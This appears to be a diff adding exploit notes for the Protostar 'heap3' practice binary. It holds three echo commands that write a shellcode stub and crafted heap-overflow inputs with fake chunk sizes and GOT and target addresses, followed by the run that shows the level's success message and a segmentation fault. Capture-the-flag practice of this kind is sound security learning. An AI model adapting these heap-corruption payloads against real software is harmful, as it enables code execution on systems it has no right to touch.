@@ -1,0 +1,7 @@
+echo -ne 'AAAABBBB\xB8\x64\x88\x04\x08\xFF\xD0' > /tmp/a
+echo -ne 'AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAA\x65\x00' > /tmp/b
+echo -ne 'AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeA\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x10\xc0\x04\x08' > /tmp/c
+
+user@protostar:/opt/protostar/bin$ ./heap3 `cat /tmp/a` `cat /tmp/b` `cat /tmp/c`
+that wasn't too bad now, was it? @ 1547199160
+Segmentation fault
